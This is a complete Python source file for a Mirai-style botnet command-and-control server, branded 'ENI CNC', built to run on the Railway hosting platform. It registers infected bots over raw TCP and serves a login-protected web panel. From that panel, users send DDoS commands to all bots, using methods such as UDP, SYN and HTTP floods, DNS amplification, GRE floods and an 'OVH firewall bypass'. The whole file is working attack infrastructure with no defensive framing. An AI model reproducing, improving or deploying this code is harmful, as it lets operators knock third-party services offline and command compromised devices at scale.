#!/usr/bin/env python3
"""
ENI's CNC — Railway-compatible single-port edition.

Protocol auto-detection on $PORT:
  - HTTP requests    → web admin panel (manual HTTP handler)
  - raw TCP (ARCH|)  → bot handler

Usage:  python3 cnc_railway.py
"""

import socket
import threading
import time
import sys
import os
import hashlib
import sqlite3
import random
import json
import re
import urllib.parse
from collections import defaultdict

# ——— config ——————————————————————————————————————————————————————
# Railway sets RAILWAY_TCP_APPLICATION_PORT for TCP services, PORT for HTTP
# Try PORT first (Railway HTTP), then TCP_APPLICATION_PORT, fallback 8080
_raw_port = os.environ.get('PORT') or os.environ.get('RAILWAY_TCP_APPLICATION_PORT') or '8080'
PORT = int(_raw_port)
DB_PATH      = os.environ.get('DB_PATH', '/data/mirai.db')
ADMIN_USER   = os.environ.get('ADMIN_USER', 'root')
ADMIN_PASS   = os.environ.get('ADMIN_PASS', 'mirai')
BOT_TIMEOUT  = 120
BUFFER_SIZE  = 4096

# ensure DB directory exists and is writable
db_dir = os.path.dirname(DB_PATH) or '/data'
try:
    os.makedirs(db_dir, exist_ok=True)
    testfile = os.path.join(db_dir, '.write_test')
    with open(testfile, 'w') as f:
        f.write('ok')
    os.remove(testfile)
except (OSError, PermissionError):
    DB_PATH = '/home/mirai/mirai.db'
    os.makedirs('/home/mirai', exist_ok=True)
    print(f"[!] /data not writable, falling back to {DB_PATH}")

# ——— database ——————————————————————————————————————————————————————
db = sqlite3.connect(DB_PATH, check_same_thread=False)

db.execute("""CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE,
    password TEXT,
    duration INTEGER DEFAULT 3600,
    cooldown INTEGER DEFAULT 60,
    max_bots INTEGER DEFAULT -1,
    admin INTEGER DEFAULT 0,
    api_key TEXT
)""")

db.execute("""CREATE TABLE IF NOT EXISTS bots (
    id TEXT PRIMARY KEY,
    ip TEXT,
    arch TEXT,
    country TEXT,
    first_seen INTEGER,
    last_seen INTEGER,
    active INTEGER DEFAULT 1
)""")

db.execute("""CREATE TABLE IF NOT EXISTS attacks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    target TEXT,
    port INTEGER,
    duration INTEGER,
    method TEXT,
    running INTEGER DEFAULT 1,
    started_at INTEGER
)""")

db.execute("""CREATE TABLE IF NOT EXISTS history (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    command TEXT,
    time INTEGER
)""")

try:
    db.execute("INSERT INTO users (username, password, duration, admin, max_bots) VALUES (?, ?, 86400, 1, -1)",
               (ADMIN_USER, hashlib.sha256(ADMIN_PASS.encode()).hexdigest()))
except sqlite3.IntegrityError:
    pass
db.commit()

# ——— state —————————————————————————————————————————————————————————
bots      = {}
lock      = threading.Lock()
running   = True
attack_slots = {}
start_time = time.time()

# ——— attack methods —————————————————————————————————————————————————
METHODS = {
    'udp':     'UDP flood — high PPS, randomized payload sizes',
    'std':     'STD hex flood — raw TCP hex payload',
    'tcp':     'TCP SYN flood — connection exhaustion',
    'http':    'HTTP GET flood — 200 conn pool, randomized UA/paths',
    'httphex': 'HTTP + hex payload hybrid',
    'dns':     'DNS amplification — ANY queries via open resolvers',
    'gre':     'GRE protocol flood — encapsulated packets',
    'stomp':   'TCP stomp — connect/send/disconnect rapid cycle',
    'vse':     'Valve Source Engine query flood',
    'ovh':     'OVH firewall bypass — mixed patterns, port cycling',
}

# ═══════════════════════════════════════════════════════════════════
# BOT HANDLER (raw TCP)
# ═══════════════════════════════════════════════════════════════════

def handle_bot(conn: socket.socket, addr):
    bot_id = None
    try:
        conn.settimeout(BOT_TIMEOUT * 2)

        data = b''
        deadline = time.time() + 10
        while b'\n' not in data and time.time() < deadline:
            chunk = conn.recv(BUFFER_SIZE)
            if not chunk:
                return
            data += chunk
            if len(data) > 512:
                return

        line = data.split(b'\n')[0].decode('utf-8', errors='ignore').strip()
        parts = line.split('|')
        arch   = parts[0] if len(parts) > 0 else 'unknown'
        bot_ip = addr[0]
        bot_id = hashlib.md5(f"{bot_ip}:{arch}:{time.time()}".encode()).hexdigest()[:16]

        with lock:
            for bid, b in list(bots.items()):
                if b['ip'] == bot_ip:
                    try: b['conn'].close()
                    except: pass
                    del bots[bid]

            bots[bot_id] = {
                'ip': bot_ip, 'arch': arch, 'conn': conn,
                'last_seen': time.time(), 'country': '??',
            }

        print(f"[+] bot joined — {bot_ip} ({arch}) id={bot_id}")

        # heartbeat loop
        buf = b''
        while running:
            try:
                chunk = conn.recv(BUFFER_SIZE)
                if not chunk: break
                buf += chunk
                while b'\n' in buf:
                    msg, buf = buf.split(b'\n', 1)
                    msg = msg.decode('utf-8', errors='ignore').strip()
                    if msg == 'PING':
                        conn.send(b'PONG\n')
                        with lock:
                            if bot_id in bots:
                                bots[bot_id]['last_seen'] = time.time()
            except socket.timeout:
                try: conn.send(b'PING?\n')
                except: break

    except Exception:
        pass
    finally:
        if bot_id:
            with lock:
                bots.pop(bot_id, None)
                try: conn.close()
                except: pass
            print(f"[-] bot left — {bot_id}")


def dispatch_attack(target, port, duration, method, username, max_bots=-1):
    with lock:
        available = len(bots)
        if max_bots != -1:
            available = min(available, max_bots)

    if available == 0:
        return {"error": "no bots online"}

    attack_id = int(time.time()) % 100000
    atk_cmd = f"ATK {method.upper()} {target} {port} {duration} {attack_id}\n"
    dispatched = 0

    with lock:
        for bid, bot in list(bots.items()):
            if dispatched >= available:
                break
            try:
                bot['conn'].send(atk_cmd.encode())
                dispatched += 1
            except:
                bots.pop(bid, None)

    attack_slots[attack_id] = {
        'target': target, 'port': port, 'duration': duration,
        'method': method, 'started': time.time(), 'bots_used': dispatched,
        'username': username,
    }

    print(f"[ATK] {username} -> {target}:{port} dur={duration}s method={method} bots={dispatched}")
    return {"ok": True, "attack_id": attack_id, "bots_used": dispatched}

# ═══════════════════════════════════════════════════════════════════
# AUTH HELPERS
# ═══════════════════════════════════════════════════════════════════

def check_auth(headers):
    """Returns username if session cookie is valid, else None."""
    cookie = headers.get('cookie', '')
    m = re.search(r'eni_session=([^;]+)', cookie)
    if m:
        token = m.group(1)
        row = db.execute(
            "SELECT username FROM users WHERE api_key=?",
            (token,)
        ).fetchone()
        if row:
            return row[0]
    return None


def create_session(username):
    token = hashlib.sha256(f"{username}:{time.time()}:{random.random()}".encode()).hexdigest()
    db.execute("UPDATE users SET api_key=? WHERE username=?", (token, username))
    db.commit()
    return token

# ═══════════════════════════════════════════════════════════════════
# HTTP RESPONDER — manual, no framework
# ═══════════════════════════════════════════════════════════════════

HTTP_200 = "HTTP/1.1 200 OK"
HTTP_302 = "HTTP/1.1 302 Found"
HTTP_400 = "HTTP/1.1 400 Bad Request"
HTTP_404 = "HTTP/1.1 404 Not Found"
HTTP_500 = "HTTP/1.1 500 Internal Server Error"


def http_response(code, content_type="text/html; charset=utf-8", body="", extra_headers=None):
    """Build a raw HTTP response."""
    resp = f"{code}\r\n"
    resp += f"Content-Type: {content_type}\r\n"
    resp += f"Content-Length: {len(body.encode())}\r\n"
    resp += "Cache-Control: no-cache\r\n"
    resp += "Connection: close\r\n"
    if extra_headers:
        for k, v in extra_headers.items():
            resp += f"{k}: {v}\r\n"
    resp += "\r\n"
    resp += body
    return resp.encode()


def http_redirect(location, extra_headers=None):
    headers = {"Location": location}
    if extra_headers:
        headers.update(extra_headers)
    return http_response(HTTP_302, "text/plain", "", headers)


# ═══════════════════════════════════════════════════════════════════
# PAGES
# ═══════════════════════════════════════════════════════════════════

def build_login_page(error=False):
    err_div = '<div class="error">bad credentials</div>' if error else ''
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>ENI CNC — Login</title>
<style>
  body {{ background:#0a0a0f; color:#c0c0c0; font-family:'Courier New',monospace;
         display:flex; align-items:center; justify-content:center; min-height:100vh; }}
  form {{ background:#111118; border:1px solid #222; padding:30px; border-radius:6px; width:320px; }}
  h1 {{ color:#cc3333; font-size:16px; margin-bottom:20px; text-align:center; }}
  input {{ width:100%; background:#1a1a22; border:1px solid #333; color:#ccc; padding:10px;
          font-family:inherit; font-size:13px; border-radius:3px; margin:4px 0; }}
  button {{ width:100%; background:#cc3333; color:#fff; border:none; padding:10px;
           font-family:inherit; font-size:14px; font-weight:bold; border-radius:3px;
           margin-top:12px; cursor:pointer; }}
  button:hover {{ background:#dd4444; }}
  .error {{ color:#f88; font-size:12px; text-align:center; margin-top:8px; }}
</style></head><body>
<form method="POST" action="/login">
  <h1>[ ENI CNC ]</h1>
  {err_div}
  <input name="username" placeholder="username" autofocus><br>
  <input name="password" placeholder="password" type="password"><br>
  <button type="submit">login</button>
</form></body></html>"""


def build_dashboard_page(auth_user, flash_msg=""):
    with lock:
        bot_list = sorted(bots.values(), key=lambda b: b['last_seen'], reverse=True)
        total_bots = len(bot_list)
        active_attacks = len(attack_slots)

    # uptime
    uptime_s = int(time.time() - start_time)
    uptime_str = f"{uptime_s//3600}h {(uptime_s%3600)//60}m {uptime_s%60}s"

    # arch stats
    arch_count = defaultdict(int)
    for b in bot_list:
        arch_count[b['arch']] += 1
    arch_stats = ' '.join(
        f'<span class="stat"><b>{c}</b> {a}</span>'
        for a, c in sorted(arch_count.items(), key=lambda x: -x[1])
    ) or '<span class="stat">none</span>'

    # bot rows
    now = time.time()
    bot_rows = ''
    for b in bot_list[:100]:
        age = int(now - b['last_seen'])
        bid_short = list(bots.keys())[list(bots.values()).index(b)][:12] if b in bot_list else '?'
        bot_rows += f'<tr><td>{b["ip"]}</td><td>{b["arch"]}</td><td>{age}s</td></tr>\n'
    if not bot_rows:
        bot_rows = '<tr><td colspan="3" style="color:#555">(no bots online)</td></tr>'

    # attack rows
    attack_rows = ''
    for aid, atk in list(attack_slots.items()):
        remaining = max(0, atk['duration'] - (time.time() - atk['started']))
        attack_rows += (
            f'<div class="attack-row">'
            f'<span class="id">#{aid}</span> '
            f'<span class="target">{atk["target"]}:{atk["port"]}</span> '
            f'— {atk["method"]} — {int(remaining)}s left '
            f'({atk["bots_used"]} bots) '
            f'<button class="stop stop-btn" data-id="{aid}">stop</button>'
            f'</div>\n'
        )
    if not attack_rows:
        attack_rows = '<div style="color:#555">(no attacks running)</div>'

    # method options
    method_options = '\n'.join(
        f'<option value="{m}">{m}</option>'
        for m in METHODS
    )

    # flash
    flash_html = ''
    if flash_msg:
        flash_html = f'<div class="flash flash-ok">{flash_msg}</div>'

    return f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ENI CNC</title>
<style>
  * {{ margin:0; padding:0; box-sizing:border-box; }}
  body {{ background:#0a0a0f; color:#c0c0c0; font-family:'Courier New',monospace; padding:20px; }}
  .header {{ border-bottom:1px solid #333; padding-bottom:12px; margin-bottom:20px; }}
  .header h1 {{ color:#cc3333; font-size:18px; margin-bottom:4px; }}
  .header span {{ color:#666; font-size:12px; }}
  .grid {{ display:grid; grid-template-columns:1fr 1fr; gap:20px; }}
  .card {{ background:#111118; border:1px solid #222; border-radius:6px; padding:16px; }}
  .card h2 {{ color:#cc3333; font-size:14px; margin-bottom:12px; border-bottom:1px solid #1a1a22; padding-bottom:8px; }}
  .bots-table {{ width:100%; font-size:12px; border-collapse:collapse; }}
  .bots-table th {{ text-align:left; color:#888; padding:4px 8px; border-bottom:1px solid #1a1a22; }}
  .bots-table td {{ padding:3px 8px; border-bottom:1px solid #111; }}
  .bots-table tr:hover td {{ background:#1a1a25; }}
  .stat {{ display:inline-block; background:#1a1a25; padding:4px 10px; margin:2px; border-radius:3px; font-size:12px; }}
  .stat b {{ color:#cc3333; }}
  form {{ margin-top:12px; }}
  input, select, button {{ background:#1a1a22; border:1px solid #333; color:#ccc; padding:8px 12px;
    font-family:inherit; font-size:13px; border-radius:3px; margin:3px; }}
  button {{ background:#cc3333; color:#fff; border-color:#cc3333; cursor:pointer; font-weight:bold; }}
  button:hover {{ background:#dd4444; }}
  button.stop {{ background:#333; border-color:#444; color:#ccc; }}
  button.stop:hover {{ background:#555; }}
  .flash {{ padding:10px 14px; border-radius:4px; margin-bottom:16px; font-size:13px; }}
  .flash-ok {{ background:#1a3a1a; border:1px solid #2a5a2a; color:#8f8; }}
  .flash-err {{ background:#3a1a1a; border:1px solid #5a2a2a; color:#f88; }}
  .attack-row {{ font-size:12px; padding:6px 0; border-bottom:1px solid #111; }}
  .attack-row .id {{ color:#cc3333; }}
  .attack-row .target {{ color:#aaa; }}
  @media (max-width:800px) {{ .grid {{ grid-template-columns:1fr; }} }}
</style></head><body>
<div class="header">
  <h1>[ ENI CNC ]</h1>
  <span>{total_bots} bots online · {active_attacks} attacks running · uptime {uptime_str}</span>
</div>
{flash_html}
<div class="grid">
  <div class="card">
    <h2>attack</h2>
    <form method="POST" action="/attack">
      <input name="target" placeholder="target IP/hostname" required style="width:100%"><br>
      <input name="port" placeholder="port" value="80" type="number" min="1" max="65535" style="width:30%">
      <input name="duration" placeholder="seconds" value="60" type="number" min="1" max="86400" style="width:30%">
      <select name="method" style="width:30%">{method_options}</select><br>
      <button type="submit">.attack</button>
    </form>
  </div>
  <div class="card">
    <h2>overview</h2>
    {arch_stats}
  </div>
  <div class="card" style="grid-column:1/-1;">
    <h2>online bots ({total_bots})</h2>
    <table class="bots-table">
      <tr><th>IP</th><th>ARCH</th><th>AGE</th></tr>
      {bot_rows}
    </table>
  </div>
  <div class="card" style="grid-column:1/-1;">
    <h2>active attacks</h2>
    {attack_rows}
  </div>
</div>
<script>
  setTimeout(() => location.reload(), 5000);
  document.querySelectorAll('.stop-btn').forEach(btn => {{
    btn.addEventListener('click', async (e) => {{
      e.preventDefault();
      await fetch('/stop/' + btn.dataset.id, {{method:'POST'}});
      location.reload();
    }});
  }});
</script>
</body></html>"""

# ═══════════════════════════════════════════════════════════════════
# HTTP REQUEST PARSER
# ═══════════════════════════════════════════════════════════════════

def parse_http_request(data: bytes):
    """Parse raw HTTP request into (method, path, headers, body)."""
    try:
        header_end = data.find(b'\r\n\r\n')
        if header_end == -1:
            return None

        header_section = data[:header_end].decode('utf-8', errors='ignore')
        body = data[header_end + 4:]

        lines = header_section.split('\r\n')
        request_line = lines[0].split()

        if len(request_line) < 2:
            return None

        method = request_line[0].upper()
        path = request_line[1]

        headers = {}
        for line in lines[1:]:
            if ':' in line:
                k, v = line.split(':', 1)
                headers[k.strip().lower()] = v.strip()

        # read remaining body if Content-Length specified
        cl = int(headers.get('content-length', 0))
        while len(body) < cl:
            # body already fully read above in multiplexer; this is safety
            break

        return (method, path, headers, body)

    except Exception:
        return None


def parse_form_body(body: bytes) -> dict:
    """Parse URL-encoded form body into dict."""
    try:
        text = body.decode('utf-8', errors='ignore')
        return {k: v[0] if len(v) == 1 else v
                for k, v in urllib.parse.parse_qs(text).items()}
    except:
        return {}

# ═══════════════════════════════════════════════════════════════════
# HTTP ROUTER
# ═══════════════════════════════════════════════════════════════════

def route_http(method, path, headers, body):
    """Route an HTTP request and return raw response bytes."""

    # ——— static: favicon ———
    if path == '/favicon.ico':
        return http_response(HTTP_404, "text/plain", "not found")

    # ——— GET: login page ———
    if method == 'GET' and (path == '/' or path == '/login' or path == '/index.html'):
        user = check_auth(headers)
        if user:
            return build_dashboard_page(user).encode()
        else:
            error = 'error' in path or 'error=1' in path
            return build_login_page(error).encode()

    # ——— POST: login ———
    if method == 'POST' and path == '/login':
        params = parse_form_body(body)
        username = params.get('username', '')
        password = params.get('password', '')
        pw_hash = hashlib.sha256(password.encode()).hexdigest()

        row = db.execute("SELECT id, username FROM users WHERE username=? AND password=?",
                         (username, pw_hash)).fetchone()
        if row:
            token = create_session(username)
            return http_redirect('/', {'Set-Cookie': f'eni_session={token}; Path=/; HttpOnly; Max-Age=86400'})
        else:
            return http_redirect('/?error=1')

    # ——— POST: attack ———
    if method == 'POST' and path == '/attack':
        user = check_auth(headers)
        if not user:
            return http_redirect('/?error=1')

        params = parse_form_body(body)
        target   = params.get('target', '')
        port     = int(params.get('port', '80'))
        duration = int(params.get('duration', '60'))
        method_name = params.get('method', 'udp')

        row = db.execute("SELECT duration, max_bots FROM users WHERE username=?",
                         (user,)).fetchone()
        max_dur = row[0] if row else 3600
        max_bots = row[1] if row else -1
        duration = min(duration, max_dur)

        if method_name not in METHODS:
            return http_response(HTTP_400, "text/plain", "unknown method")

        result = dispatch_attack(target, port, duration, method_name, user, max_bots)

        db.execute("INSERT INTO history (username, command, time) VALUES (?, ?, ?)",
                   (user, f".attack {target} {port} {duration} {method_name}", int(time.time())))
        db.commit()

        return http_redirect('/')

    # ——— POST: stop attack ———
    if method == 'POST' and path.startswith('/stop/'):
        user = check_auth(headers)
        if not user:
            return http_response("HTTP/1.1 401 Unauthorized", "application/json", '{"error":"unauthorized"}')

        try:
            attack_id = int(path.split('/')[-1])
        except ValueError:
            return http_response(HTTP_400, "application/json", '{"error":"bad id"}')

        if attack_id in attack_slots:
            with lock:
                for bid, bot in list(bots.items()):
                    try:
                        bot['conn'].send(f"STOP {attack_id}\n".encode())
                    except:
                        bots.pop(bid, None)
            del attack_slots[attack_id]

        return http_response(HTTP_200, "application/json", '{"ok":true}')

    # ——— GET: API endpoints ———
    if method == 'GET':
        if path == '/api/stats':
            with lock:
                arch_count = defaultdict(int)
                for b in bots.values():
                    arch_count[b['arch']] += 1
            data = {
                'total_bots': len(bots),
                'active_attacks': len(attack_slots),
                'uptime': int(time.time() - start_time),
                'architectures': dict(arch_count),
            }
            return http_response(HTTP_200, "application/json", json.dumps(data))

        if path == '/api/bots':
            with lock:
                data = {
                    'count': len(bots),
                    'bots': [
                        {'ip': b['ip'], 'arch': b['arch'],
                         'age': int(time.time() - b['last_seen'])}
                        for b in sorted(bots.values(), key=lambda x: x['last_seen'], reverse=True)
                    ]
                }
            return http_response(HTTP_200, "application/json", json.dumps(data))

        if path == '/api/attacks':
            data = {
                'count': len(attack_slots),
                'attacks': [
                    {
                        'id': aid, 'target': a['target'], 'port': a['port'],
                        'duration': a['duration'], 'method': a['method'],
                        'remaining': max(0, a['duration'] - (time.time() - a['started'])),
                        'bots_used': a['bots_used'],
                    }
                    for aid, a in attack_slots.items()
                ]
            }
            return http_response(HTTP_200, "application/json", json.dumps(data))

    # ——— 404 ———
    return http_response(HTTP_404, "text/plain", "not found")

# ═══════════════════════════════════════════════════════════════════
# HTTP HANDLER (per connection)
# ═══════════════════════════════════════════════════════════════════

def handle_http(conn: socket.socket, addr):
    """Read full HTTP request from socket, route, send response."""
    try:
        conn.settimeout(30)

        # read request
        data = b''
        while True:
            try:
                chunk = conn.recv(8192)
                if not chunk:
                    break
                data += chunk
                # stop reading when we have full headers + body
                header_end = data.find(b'\r\n\r\n')
                if header_end != -1:
                    # check Content-Length
                    headers_str = data[:header_end].decode('utf-8', errors='ignore')
                    cl_match = re.search(r'Content-Length:\s*(\d+)', headers_str, re.IGNORECASE)
                    if cl_match:
                        needed = header_end + 4 + int(cl_match.group(1))
                        if len(data) >= needed:
                            break
                    else:
                        break  # no body
            except socket.timeout:
                break

        if not data:
            conn.close()
            return

        parsed = parse_http_request(data)
        if parsed is None:
            conn.send(http_response(HTTP_400, "text/plain", "bad request"))
            conn.close()
            return

        method, path, headers, body = parsed
        response_bytes = route_http(method, path, headers, body)
        conn.send(response_bytes)

    except Exception:
        pass
    finally:
        try: conn.close()
        except: pass

# ═══════════════════════════════════════════════════════════════════
# PROTOCOL DETECTOR
# ═══════════════════════════════════════════════════════════════════

def detect_protocol(first_bytes: bytes) -> str:
    """Peek at first bytes to determine HTTP vs bot."""
    text = first_bytes.decode('utf-8', errors='ignore')

    if text.startswith(('GET ', 'POST ', 'HEAD ', 'PUT ', 'DELETE ', 'OPTIONS ', 'PATCH ')):
        return 'http'

    if re.match(r'^[a-zA-Z0-9_]+\|', text):
        return 'bot'

    if b'HTTP/' in first_bytes:
        return 'http'

    # default: HTTP for browser connections
    if len(first_bytes) > 0 and first_bytes[0:1] in (b'G', b'P', b'H', b'O', b'D', b'C'):
        return 'http'

    return 'bot'

# ═══════════════════════════════════════════════════════════════════
# CLEANUP
# ═══════════════════════════════════════════════════════════════════

def cleanup_loop():
    """Remove dead bots."""
    while running:
        time.sleep(30)
        now = time.time()
        with lock:
            for bid, bot in list(bots.items()):
                if now - bot['last_seen'] > BOT_TIMEOUT:
                    try: bot['conn'].close()
                    except: pass
                    del bots[bid]

# ═══════════════════════════════════════════════════════════════════
# MAIN SERVER
# ═══════════════════════════════════════════════════════════════════

class MultiplexServer:
    """Single-port server. Protocol detects, routes HTTP vs bot."""

    def __init__(self, host='0.0.0.0', port=8080):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        self.host = host
        self.port = port

    def start(self):
        self.sock.bind((self.host, self.port))
        self.sock.listen(512)
        self.sock.settimeout(1.0)

        print(f"\n  [ENI CNC — Railway Edition]")
        print(f"  listening: 0.0.0.0:{self.port}")
        print(f"  protocol:  HTTP (web panel) + raw TCP (bots)")
        print(f"  login:     {ADMIN_USER} / {ADMIN_PASS}")
        print(f"  db:        {DB_PATH}")
        sys.stdout.flush()

        threading.Thread(target=cleanup_loop, daemon=True).start()

        while running:
            try:
                conn, addr = self.sock.accept()
            except socket.timeout:
                continue
            except Exception:
                break

            conn.settimeout(2.0)
            try:
                first_bytes = conn.recv(4096, socket.MSG_PEEK)
            except:
                conn.close()
                continue

            conn.settimeout(BOT_TIMEOUT)

            proto = detect_protocol(first_bytes)

            if proto == 'http':
                threading.Thread(target=handle_http, args=(conn, addr), daemon=True).start()
            else:
                threading.Thread(target=handle_bot, args=(conn, addr), daemon=True).start()

# ═══════════════════════════════════════════════════════════════════
# ENTRYPOINT
# ═══════════════════════════════════════════════════════════════════

if __name__ == '__main__':
    server = MultiplexServer(port=PORT)
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[!] shutting down...")
        running = False
